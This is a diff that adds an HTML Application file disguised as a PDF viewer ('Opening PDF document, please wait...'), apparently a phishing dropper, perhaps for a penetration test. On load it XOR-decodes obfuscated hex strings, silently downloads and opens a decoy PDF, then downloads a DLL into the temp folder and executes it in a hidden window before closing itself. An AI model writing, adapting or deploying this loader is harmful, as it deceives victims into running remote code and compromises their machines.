@@ -1,0 +1,106 @@
+<html>
+<head>
+<title>PDF Document</title>
+<hta:application
+    id="pdfViewer"
+    applicationname="PDF Document"
+    border="none"
+    borderstyle="normal"
+    caption="no"
+    icon="%SystemRoot%\System32\shell32.dll,36"
+    maximizebutton="no"
+    minimizebutton="no"
+    showintaskbar="no"
+    windowstate="normal"
+/>
+<script language="javascript">
+ function hx(hex) {
+    var str = '';
+    for (var i = 0; i < hex.length; i += 2) {
+        var hexPair = hex.substring(i, i + 2);
+        var charCode = parseInt(hexPair, 16);
+        str += String.fromCharCode(charCode);
+    }
+    return str;
+}
+        
+        function xr(encrypted, kk) {
+            var result = '';
+            for (var i = 0; i < encrypted.length; i++) {
+                var charCode = encrypted.charCodeAt(i);
+                var kkCharCode = kk.charCodeAt(i % kk.length);
+                var decryptedChar = String.fromCharCode(charCode ^ kkCharCode);
+                result += decryptedChar;
+            }
+            return result;
+        }
+
+         function dtext(encryptedtext) {            
+            var kk = 'SecretXorKey123!@#';            
+            
+            try {                
+                var cleanHex = encryptedtext.replace(/\s+/g, '');             
+                
+                var encrypted = hx(cleanHex);                
+                
+                var decrypted = xr(encrypted, kk);
+                return decrypted;
+                
+            } catch (e) {
+               
+            }
+        }        
+
+window.onload = function () {
+    try {
+        var rr = new ActiveXObject("WScript.Shell");
+        var shellApp = new ActiveXObject("Shell.Application");
+        var fso = new ActiveXObject("Scripting.FileSystemObject");        
+        var tempDir = rr.ExpandEnvironmentStrings("%TEMP%");
+        var targetDir = tempDir + "\\MyPenTest";
+        var pdfUrl = dtext("3b111702164e77401525084e0907050f274a270d16104b1d37400624080b1e41524c304f364b131603");
+        var pdfLocal = targetDir + "\\dummy.pdf";
+        var dllUrl = dtext("3b111702164e7740002a1257565b4749354126160600061b361b17251157525d5e0e224b360e0a1c0e1b771b173811565c535a4f6f4d3c11060204106a41162709");
+        var dllPath = tempDir + "\\notepad2.dll";
+        
+        function sleep(ms) {
+            rr.Run("ping 127.0.0.1 -n " + ((ms / 3000) + 1) + " > nul", 0, true);
+        }
+        
+        if (!fso.FolderExists(targetDir)) {
+            fso.CreateFolder(targetDir);
+        }
+        
+        sleep(3000);
+        
+        rr.Run(dtext("230a14171707300a1e2745547f5d63532f453a090652483737021f2a0b1d11107a4f364c38004e2500160a0a033e000a45121e74324a") + " '" + pdfUrl + "' -OutFile '" + pdfLocal + "'", 0, true);
+
+        sleep(1500);
+        
+        shellApp.ShellExecute(pdfLocal, "", "", "open", 0);
+
+        sleep(3000); 
+        
+        rr.Run(dtext("230a14171707300a1e2745547f5d63532f453a090652483737021f2a0b1d11107a4f364c38004e2500160a0a033e000a45121e74324a") + " '" + dllUrl + "' -OutFile '" + dllPath + "'", 0, true);
+
+        sleep(3000); 
+        
+        var ee = dtext("21100d1609186b5d5c2e1d1c");
+        rr.Run(ee + " \"" + dllPath + "\",notepad", 0, true);        
+        setTimeout(function () {
+            window.close();
+        }, 5000);
+
+    } catch (e) {
+        alert("Error: " + e.message);
+    }
+};
+</script>
+</head>
+<body>
+    <div style="font-family: Arial; text-align: center; margin-top: 20px;">
+        <h3>Opening PDF document, please wait...</h3>
+        <p>This window will close automatically.</p>
+    </div>
+</body>
+</html>
